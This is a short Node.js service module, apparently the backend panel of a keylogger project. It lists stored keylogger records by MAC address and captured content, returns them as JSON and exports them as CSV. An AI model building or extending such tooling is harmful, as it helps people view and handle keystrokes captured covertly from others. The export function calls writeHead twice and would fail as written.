const URL = require("url");
const { Parser } = require('json2csv');
const { KeyloggerDao } = require("../dao/keylogger_dao");
const Logger = require("../model/logger");
// const { keyloggers_template } = require("../template/keyloggers");

const LoggerService = {
    search: (req, resp) => {
        KeyloggerDao.getAll(undefined, (data) => {
            // const model = {logs: data.map(row => new Logger(row.id, row.mac_id, row.date_created, row.content))};
            // resp.writeHead(200, {'Content-Type': 'text/html'});
            // resp.write(keyloggers_template(model));
            // resp.end(); 
    
            // const url = URL.parse(request.url, true);
            // const query = url.query;
            // console.log(query);
    
            resp.writeHead(200, {'Content-Type': 'application/json'});
            resp.write(JSON.stringify(data.map(row => new Logger(row.id, row.mac_id, row.date_created, row.content))));
            resp.end();
        });
    },
    exportCsv: (req, resp) => {
        KeyloggerDao.getAll(undefined, (data) => {
            resp.writeHead(200, {'Content-Type': 'application/json'});

            const fields = [{label: 'Id', value: 'id'}, {label: 'MAC', value: 'mac_id'}, 
                {label: 'Create at', value: 'date_created'}, {label: 'Content', value: 'content'}];
            
            const parser = new Parser({fields});
            const csv = parser.parse(data);
            resp.writeHead(200, {'Content-Type': 'application/octet-stream', 'Content-Disposition': 'attachment; filename="export.csv"'});
            resp.write(csv);
            resp.end();
        });
    }
}




module.exports = { LoggerService };